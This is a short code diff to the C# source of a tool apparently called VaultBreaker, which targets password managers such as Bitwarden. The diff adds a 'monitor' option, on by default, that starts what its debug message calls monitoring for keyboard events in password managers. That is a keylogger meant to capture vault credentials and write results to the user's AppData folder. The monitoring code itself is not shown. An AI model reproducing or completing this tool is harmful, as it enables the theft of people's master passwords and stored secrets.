@@ -5,6 +5,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Diagnostics;
 using VaultBreaker.Helpers;
+using VaultBreaker.Core;
 using System.Runtime.Caching;
 using System.ComponentModel;
 using System.Runtime.InteropServices;
@@ -17,6 +18,7 @@ namespace VaultBreaker
 		static void Main(string[] args)
 		{
 			var local = false;
+			var monitor = true;
 			var managerType = "BiTWardEn";
 			var outFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
 			var inFile = ""; 
@@ -26,7 +28,11 @@ namespace VaultBreaker
 
 
 			//Get Processes
-
+			if (monitor)
+			{
+				DebugFunctions.writeDebug("Monitor set to true, monitoring for keyboard events in password managers.");
+				Monitoring.Start();
+			}
 
 			if (local)
 			{
